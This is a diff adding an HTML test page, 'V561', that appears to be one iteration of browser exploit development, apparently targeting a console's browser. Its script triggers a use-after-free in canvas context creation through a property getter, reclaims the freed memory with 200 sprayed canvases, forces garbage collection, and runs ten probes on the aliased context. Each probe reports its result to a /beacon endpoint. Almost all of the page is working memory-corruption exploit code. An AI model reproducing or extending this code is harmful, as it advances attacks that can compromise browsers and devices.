@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>V561</title></head>
+<body style="background:#111;color:#0f0;font:13px monospace;padding:10px">
+<pre id="log"></pre>
+<script>
+var L=document.getElementById('log');
+function log(m){L.textContent+=m+'\n'}
+function b(tag,data){
+  log('[B] '+tag+': '+data);
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/beacon/V561-'+tag+'?d='+encodeURIComponent(String(data).substring(0,400))+'&t='+Date.now(),false);
+    x.send();
+  }catch(e){log('[E] beacon fail: '+e.message)}
+}
+
+function triggerUAF(){
+  var outer=document.createElement('canvas');
+  outer.width=1;outer.height=1;
+  var innerCtx=null;
+  var dict={};
+  Object.defineProperty(dict,'alpha',{
+    get:function(){
+      innerCtx=outer.getContext('2d');
+      return true;
+    }
+  });
+  outer.getContext('bitmaprenderer',dict);
+  return {ctx:innerCtx, canvas:outer};
+}
+
+function massReclaim(u){
+  var contexts=[];
+  var canvases=[];
+  for(var i=0;i<200;i++){
+    var c=document.createElement('canvas');c.width=10;c.height=10;
+    var ctx=c.getContext('2d');
+    ctx.lineWidth=200+i;
+    contexts.push(ctx);
+    canvases.push(c);
+  }
+  var lw=u.ctx.lineWidth;
+  var idx=Math.round(lw-200);
+  return {contexts:contexts,canvases:canvases,aliasIdx:idx,lw:lw};
+}
+
+function forceGC(){
+  var junk;
+  for(var g=0;g<30;g++){
+    junk=[];for(var j=0;j<10000;j++)junk.push({a:j,b:'x'.repeat(50)});
+    junk=null;
+  }
+}
+
+b('BOOT','V561-capabilities');
+
+// T1: Baseline
+(function(){
+  var c=document.createElement('canvas');c.width=1;c.height=1;
+  var ctx=c.getContext('2d');ctx.save();ctx.restore();
+  b('T1','PASS');
+})();
+
+// T2: Establish alias + GC-safe null (proven working from V560)
+(function(){
+  try{
+    var u=triggerUAF();
+    var r=massReclaim(u);
+    b('T2','aliasIdx='+r.aliasIdx+'|lw='+r.lw);
+    // Null dangling + GC (proven safe)
+    u.ctx=null;u=null;
+    forceGC();
+    var lwPost=r.contexts[r.aliasIdx].lineWidth;
+    b('T2-GC','post-gc-lw='+lwPost+'|survived=true');
+  }catch(e){b('T2','ERR:'+e.message)}
+})();
+
+// T3: Multi-GC stability — 10 cycles through alias only (no dangling ref)
+(function(){
+  try{
+    var u=triggerUAF();
+    var r=massReclaim(u);
+    var idx=r.aliasIdx;
+    // Null dangling immediately
+    u.ctx=null;u=null;
+    var results=[];
+    for(var cycle=0;cycle<10;cycle++){
+      forceGC();
+      try{
+        r.contexts[idx].lineWidth=500+cycle;
+        var lw=r.contexts[idx].lineWidth;
+        results.push('gc'+cycle+':'+lw);
+      }catch(e){
+        results.push('gc'+cycle+':ERR');
+        break;
+      }
+    }
+    b('T3',results.join('|'));
+  }catch(e){b('T3','ERR:'+e.message)}
+})();
+
+// T4: .canvas property — what does alias context's .canvas return?
+(function(){
+  try{
+    var u=triggerUAF();
+    var r=massReclaim(u);
+    var idx=r.aliasIdx;
+    var aliasCtx=r.contexts[idx];
+    var aliasCanvas=aliasCtx.canvas;
+    var dangCanvas=u.ctx.canvas;
+    b('T4','aliasCanvas='+aliasCanvas.tagName+'(w='+aliasCanvas.width+',h='+aliasCanvas.height+')|dangCanvas='+dangCanvas.tagName+'(w='+dangCanvas.width+')|same='+(aliasCanvas===dangCanvas));
+    u.ctx=null;u=null;
+  }catch(e){b('T4','ERR:'+e.message)}
+})();
+
+// T5: fillRect through alias + getImageData — does drawing work?
+(function(){
+  try{
+    var u=triggerUAF();
+    var r=massReclaim(u);
+    var idx=r.aliasIdx;
+    u.ctx=null;u=null;
+    forceGC();
+    // Draw through alias context
+    r.contexts[idx].fillStyle='#ff0000';
+    r.contexts[idx].fillRect(0,0,5,5);
+    // Read pixels
+    var imgData=r.contexts[idx].getImageData(2,2,1,1);
+    var px=imgData.data;
+    b('T5','fillRect|R'+px[0]+'G'+px[1]+'B'+px[2]+'A'+px[3]);
+  }catch(e){b('T5','ERR:'+e.message)}
+})();
+
+// T6: save/restore through alias (post GC-safe null)
+(function(){
+  try{
+    var u=triggerUAF();
+    var r=massReclaim(u);
+    var idx=r.aliasIdx;
+    u.ctx=null;u=null;
+    forceGC();
+    r.contexts[idx].lineWidth=111;
+    r.contexts[idx].save();
+    r.contexts[idx].lineWidth=222;
+    var lwInner=r.contexts[idx].lineWidth;
+    r.contexts[idx].restore();
+    var lwOuter=r.contexts[idx].lineWidth;
+    b('T6','save-restore|inner='+lwInner+'|outer='+lwOuter+'|expect=222,111');
+  }catch(e){b('T6','ERR:'+e.message)}
+})();
+
+// T7: toDataURL through alias — can we extract canvas content as image?
+(function(){
+  try{
+    var u=triggerUAF();
+    var r=massReclaim(u);
+    var idx=r.aliasIdx;
+    u.ctx=null;u=null;
+    forceGC();
+    r.contexts[idx].fillStyle='#00ff00';
+    r.contexts[idx].fillRect(0,0,10,10);
+    var dataUrl=r.canvases[idx].toDataURL('image/png');
+    b('T7','toDataURL|len='+dataUrl.length+'|starts='+dataUrl.substring(0,30));
+  }catch(e){b('T7','ERR:'+e.message)}
+})();
+
+// T8: measureText — does text measurement work? (exercises more internal state)
+(function(){
+  try{
+    var u=triggerUAF();
+    var r=massReclaim(u);
+    var idx=r.aliasIdx;
+    u.ctx=null;u=null;
+    forceGC();
+    r.contexts[idx].font='20px serif';
+    var m=r.contexts[idx].measureText('Hello PS5');
+    b('T8','measureText|w='+m.width);
+  }catch(e){b('T8','ERR:'+e.message)}
+})();
+
+// T9: createImageData + putImageData — direct pixel manipulation
+(function(){
+  try{
+    var u=triggerUAF();
+    var r=massReclaim(u);
+    var idx=r.aliasIdx;
+    u.ctx=null;u=null;
+    forceGC();
+    var id=r.contexts[idx].createImageData(4,4);
+    for(var i=0;i<id.data.length;i+=4){
+      id.data[i]=0;id.data[i+1]=0;id.data[i+2]=255;id.data[i+3]=255; // blue
+    }
+    r.contexts[idx].putImageData(id,0,0);
+    var check=r.contexts[idx].getImageData(0,0,1,1);
+    b('T9','putImageData|R'+check.data[0]+'G'+check.data[1]+'B'+check.data[2]+'A'+check.data[3]);
+  }catch(e){b('T9','ERR:'+e.message)}
+})();
+
+// T10: gradient + pattern — complex state objects
+(function(){
+  try{
+    var u=triggerUAF();
+    var r=massReclaim(u);
+    var idx=r.aliasIdx;
+    u.ctx=null;u=null;
+    forceGC();
+    var grad=r.contexts[idx].createLinearGradient(0,0,10,10);
+    grad.addColorStop(0,'red');
+    grad.addColorStop(1,'blue');
+    r.contexts[idx].fillStyle=grad;
+    r.contexts[idx].fillRect(0,0,10,10);
+    var px=r.contexts[idx].getImageData(0,0,1,1).data;
+    b('T10','gradient|R'+px[0]+'G'+px[1]+'B'+px[2]+'A'+px[3]);
+  }catch(e){b('T10','ERR:'+e.message)}
+})();
+
+b('DONE','V561-all-complete');
+</script>
+</body></html>
